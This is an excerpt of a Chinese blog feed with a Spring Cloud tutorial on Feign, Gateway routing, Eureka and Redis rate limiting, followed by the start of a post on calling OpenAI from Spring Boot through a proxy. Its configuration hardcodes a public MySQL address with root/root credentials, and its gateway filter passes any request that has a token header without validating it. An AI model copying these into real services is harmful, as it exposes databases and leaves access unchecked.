        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>
</code></pre>
</li>
<li><p>application.yaml</p>
<pre><code class="hljs yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9001</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">user-check</span>

  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://81.68.252.36:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">root</span>

<span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
<span class="hljs-comment">#      table-prefix: tbl_</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>
  <span class="hljs-attr">configuration:</span> <span class="hljs-comment"># 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果</span>
    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span>
<span class="hljs-attr">eureka:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">service-url:</span>
      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre>
</li>
<li><p>在启动类中添加注释<code>@EnableDiscoveryClient</code></p>
</li>
<li><p>service和dao层代码与之前写内容基本一致</p>
</li>
<li><p>在api-user-login模块中调用user-check</p>
<ul>
<li><p>创建UserCheckClient</p>
<pre><code class="hljs java"><span class="hljs-meta">@FeignClient(value = &quot;user-check&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserCheckClient</span> &#123;

    <span class="hljs-meta">@GetMapping(&quot;user/check&quot;)</span>
    <span class="hljs-keyword">public</span> Users <span class="hljs-title function_">userCheck</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,<span class="hljs-meta">@RequestParam(&quot;password&quot;)</span> String password)</span>;
&#125;</code></pre>

<p>其中<code>@FeignClient(value = &quot;user-check&quot;)</code>中的value要与注册到eureka中服务名相同，<code>@GetMapping(&quot;user/check&quot;)</code>要与user-check的controller中的访问路径相同。</p>
<p>方法名也要与controller中的方法相同。并且在有多个参数的情况下需要在每个参数前加上<code>@RequestParam(&quot;username&quot;)</code>，否则fegin调用时，会将所有的参数当成post方式的请求体，从而报错。</p>
<pre><code class="hljs less"><span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Users</span> <span class="hljs-selector-tag">userCheck</span>(<span class="hljs-variable">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) String username,<span class="hljs-variable">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) String password);</code></pre>
</li>
<li><p>api-user-login在service中进行服务调用即可</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.api.service.impl;

<span class="hljs-keyword">import</span> com.qfedu.api.service.UserService;
<span class="hljs-keyword">import</span> com.qfedu.api.service.fegin.UserCheckClient;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.beans.Users;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;

    <span class="hljs-meta">@Qualifier(&quot;com.qfedu.api.service.fegin.UserCheckClient&quot;)</span>
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserCheckClient userCheckClient;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">checkLogin</span><span class="hljs-params">(String username, String password)</span> &#123;
        <span class="hljs-comment">// 调用另外一个服务从数据库中查询到用户信息</span>
        <span class="hljs-type">Users</span> <span class="hljs-variable">users</span> <span class="hljs-operator">=</span> userCheckClient.userCheck(username, password);
        <span class="hljs-keyword">if</span>(users == <span class="hljs-literal">null</span>) &#123;
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;密码错误！&quot;</span>);
        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;null&quot;</span>.equals(users.getNickname()))&#123;
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;用户名不存在！&quot;</span>);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> ResultVO.success(users);
        &#125;
    &#125;
&#125;
</code></pre></li>
</ul>
</li>
</ul>
<h3 id="搭建gateway"><a href="#搭建gateway" class="headerlink" title="搭建gateway"></a>搭建gateway</h3><ul>
<li><p>创建gateway服务模块</p>
</li>
<li><p>pom文件内容</p>
<pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;
&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;
    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;<span class="hljs-number">2.6</span><span class="hljs-number">.2</span>&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.qfedu&lt;/groupId&gt;
    &lt;artifactId&gt;gateway&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">2.1</span><span class="hljs-number">.1</span>&lt;/version&gt;
    &lt;name&gt;gateway&lt;/name&gt;
    &lt;description&gt;Demo project <span class="hljs-keyword">for</span> Spring Boot&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;<span class="hljs-number">1.8</span>&lt;/java.version&gt;
        &lt;spring-cloud.version&gt;<span class="hljs-number">2021.0</span><span class="hljs-number">.3</span>&lt;/spring-cloud.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.projectreactor&lt;/groupId&gt;
            &lt;artifactId&gt;reactor-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
    &lt;dependencyManagement&gt;
        &lt;dependencies&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;
                &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;
                &lt;type&gt;pom&lt;/type&gt;
                &lt;scope&gt;<span class="hljs-keyword">import</span>&lt;/scope&gt;
            &lt;/dependency&gt;
        &lt;/dependencies&gt;
    &lt;/dependencyManagement&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
</li>
<li><p>在application.yml中配置相关信息</p>
<pre><code class="hljs yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-service</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8001</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-service</span>
            <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8002</span>
            <span class="hljs-attr">predicates:</span>
              <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span>
</code></pre>
</li>
<li><p>实现全局过滤器</p>
<blockquote>
<p>当用户访问8000端口时，所有的请求都会被该过滤器拦截</p>
<p>因此全局过滤器可以进行权限验证</p>
</blockquote>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.gateway.filter;

<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;
<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;
<span class="hljs-keyword">import</span> org.springframework.core.Ordered;
<span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.server.ServerWebExchange;
<span class="hljs-keyword">import</span> reactor.core.publisher.Mono;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyGlobalFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">GlobalFilter</span>, Ordered &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Mono&lt;Void&gt; <span class="hljs-title function_">filter</span><span class="hljs-params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;
        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);
        System.out.println(<span class="hljs-string">&quot;进入全局过滤器&quot;</span>);
        List&lt;String&gt; token = exchange.getRequest().getHeaders().get(<span class="hljs-string">&quot;token&quot;</span>);

        <span class="hljs-keyword">if</span>(token != <span class="hljs-literal">null</span> &amp;&amp; token.size() &gt; <span class="hljs-number">0</span>)&#123;
            <span class="hljs-comment">// 对token进行验证，如果验证通过则放行本次拦截</span>
            <span class="hljs-keyword">return</span> chain.filter(exchange);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-comment">// 验证不通过，则返回对应的状态码</span>
            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);
            <span class="hljs-comment">// 拦截请求</span>
            <span class="hljs-keyword">return</span> exchange.getResponse().setComplete();
        &#125;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getOrder</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    &#125;
&#125;</code></pre>
</li>
<li><p>动态路由配置</p>
<blockquote>
<p>使用服务注册与发现实现动态路由</p>
</blockquote>
<ul>
<li><p>将gateway服务模块加入到eureka中，即添加依赖添加配置文件</p>
<pre><code class="hljs properties"><span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">service-url</span>:<span class="hljs-string"></span>
      <span class="hljs-attr">defaultZone</span>: <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre>
</li>
<li><p>使用注册到eureka中的服务名替换ip地址</p>
<blockquote>
<p>lb代表使用负载均衡模式，默认策略时轮询</p>
</blockquote>
<pre><code class="hljs yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>

  <span class="hljs-attr">main:</span>
    <span class="hljs-attr">web-application-type:</span> <span class="hljs-string">reactive</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-login</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-login</span>
          <span class="hljs-comment">#uri: http://127.0.0.1:8001</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-regist</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-regist</span>
          <span class="hljs-attr">predicates:</span>
             <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span>
<span class="hljs-attr">eureka:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">service-url:</span>
      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre></li>
</ul>
</li>
</ul>
<h3 id="Gateway限流"><a href="#Gateway限流" class="headerlink" title="Gateway限流"></a>Gateway限流</h3><blockquote>
<p>基于令牌桶实现的网关限流，使用redis作为桶结合过滤器实现限流</p>
</blockquote>
<ul>
<li><p>添加依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis-reactive<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-pool2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
</li>
<li><p>配置application.yml</p>
<pre><code class="hljs yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>

  <span class="hljs-attr">main:</span>
    <span class="hljs-attr">web-application-type:</span> <span class="hljs-string">reactive</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-login</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8001</span>
<span class="hljs-comment">#          uri: lb://api-user-login</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>
           <span class="hljs-comment">#限流策略配置</span>
          <span class="hljs-attr">filters:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">RequestRateLimiter</span>
              <span class="hljs-attr">args:</span>
                <span class="hljs-attr">redis-rate-limiter.replenishRate:</span> <span class="hljs-number">1</span> <span class="hljs-comment">#令牌桶每s的填充速度</span>
                <span class="hljs-attr">redis-rate-limiter.burstCapacity:</span> <span class="hljs-number">2</span> <span class="hljs-comment"># 令牌桶容量</span>
                <span class="hljs-attr">redis-rate-limiter.requestedTokens:</span> <span class="hljs-number">1</span>
                <span class="hljs-attr">key-resolver:</span> <span class="hljs-string">&quot;#&#123;@keyResolver&#125;&quot;</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-regist</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-regist</span>
          <span class="hljs-attr">predicates:</span>
             <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>
    <span class="hljs-attr">database:</span> <span class="hljs-number">0</span>
    <span class="hljs-attr">password:</span>
<span class="hljs-comment">#    lettuce:</span>
<span class="hljs-comment">#      pool:</span>
<span class="hljs-comment">#        max-active: 10</span>
<span class="hljs-comment">#        max-wait: 1000</span>
<span class="hljs-comment">#        max-idle: 5</span>
<span class="hljs-comment">#        min-idle: 3</span>
<span class="hljs-attr">eureka:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">service-url:</span>
      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre>
</li>
<li><p>配置keyResolver</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.gateway.config;

<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.ratelimit.KeyResolver;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> reactor.core.publisher.Mono;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppConfig</span> &#123;
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KeyResolver <span class="hljs-title function_">keyResolver</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-comment">//http://localhost:9999/order/query?user=1</span>
        <span class="hljs-comment">//使⽤请求中的user参数的值作为令牌桶的key</span>
        <span class="hljs-comment">//return exchange -&gt;Mono.just(exchange.getRequest().getQueryParams().getFirst(&quot;user&quot;));</span>
        <span class="hljs-keyword">return</span> exchange -&gt;
                Mono.just(exchange.getRequest().getURI().getPath());
    &#125;
&#125;</code></pre></li>
</ul>
<p>当用户访问的速度超过了令牌的产生速度时就会无法访问，返回429的状态码</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220731190403002.png" alt="image-20220731190403002"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
  </entry>
  <entry>
    <title>java-openai</title>
    <url>/2023/06/27/java-openai/</url>
    <content><![CDATA[<h1 id="chatbox"><a href="#chatbox" class="headerlink" title="chatbox"></a>chatbox</h1><p>在做一个项目，在springboot中集成openai的聊天机器人，需要通过openai-key调用。</p>
<p>OPENAI开源openai-java项目地址：<a href="https://github.com/TheoKanning/openai-java">https://github.com/TheoKanning/openai-java</a></p>
<p>注意：需要翻墙使用</p>
<h1 id="使用openai-java"><a href="#使用openai-java" class="headerlink" title="使用openai-java"></a>使用openai-java</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><p>在springboot项目中引入相关依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.theokanning.openai-gpt3-java<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.12.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.squareup.retrofit2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>retrofit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.squareup.retrofit2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>adapter-rxjava2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.squareup.retrofit2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>converter-jackson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span>
				<span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span>
					<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
					<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-databind<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
				<span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span>
			<span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<p>准备好openai-key，官网<a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230627195547417.png" alt="image-20230627195547417"></p>
<h2 id="使用openai-gpt3-java"><a href="#使用openai-gpt3-java" class="headerlink" title="使用openai-gpt3-java"></a>使用openai-gpt3-java</h2><p>代码如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> GlobalResult <span class="hljs-title function_">chat</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> JSONObject jsonObject)</span> &#123;
    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> jsonObject.getString(<span class="hljs-string">&quot;message&quot;</span>);
    <span class="hljs-keyword">if</span> (StringUtils.isBlank(message)) &#123;
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;参数异常！&quot;</span>);
    &#125;
    <span class="hljs-type">ChatMessage</span> <span class="hljs-variable">chatMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChatMessage</span>(<span class="hljs-string">&quot;user&quot;</span>, message);
    List&lt;ChatMessage&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">4</span>);
    list.add(chatMessage);
    <span class="hljs-type">OpenAiService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAiService</span>(token, Duration.ofSeconds(<span class="hljs-number">180</span>));
    <span class="hljs-type">ChatCompletionRequest</span> <span class="hljs-variable">completionRequest</span> <span class="hljs-operator">=</span> ChatCompletionRequest.builder()
        .model(<span class="hljs-string">&quot;gpt-3.5-turbo&quot;</span>)
        .stream(<span class="hljs-literal">true</span>)
        .messages(list)
        .build();
    service.streamChatCompletion(completionRequest).doOnError(Throwable::printStackTrace)
        .blockingForEach(chunk -&gt; &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> chunk.getChoices().get(<span class="hljs-number">0</span>).getMessage().getContent();
            <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;
                <span class="hljs-keyword">return</span>;
            &#125;
            System.out.print(text);

        &#125;);
    service.shutdownExecutor();
    <span class="hljs-keyword">return</span> GlobalResultGenerator.genSuccessResult();
&#125;</code></pre>

<p>但是上述代码出现错误，原因是连接超时，应该就是代理出现了问题，虽然我开启了全局系统代理也没法解决。</p>
<p>解决方法如下，添加请求代理的配置</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testOpenAi</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> defaultObjectMapper();
    <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(Proxy.Type.HTTP, <span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">7890</span>));
    <span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span>  defaultClient(token,Duration.ofSeconds(<span class="hljs-number">10000</span>))
        .newBuilder()
        .proxy(proxy)
        .build();
    <span class="hljs-type">Retrofit</span> <span class="hljs-variable">retrofit</span> <span class="hljs-operator">=</span> defaultRetrofit(client, mapper);
    <span class="hljs-type">OpenAiApi</span> <span class="hljs-variable">api</span> <span class="hljs-operator">=</span> retrofit.create(OpenAiApi.class);
    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello!&quot;</span>;
    <span class="hljs-keyword">if</span> (StringUtils.isBlank(message)) &#123;
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;参数异常！&quot;</span>);
    &#125;
    <span class="hljs-type">ChatMessage</span> <span class="hljs-variable">chatMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChatMessage</span>(<span class="hljs-string">&quot;user&quot;</span>, message);
    List&lt;ChatMessage&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">4</span>);
    list.add(chatMessage);
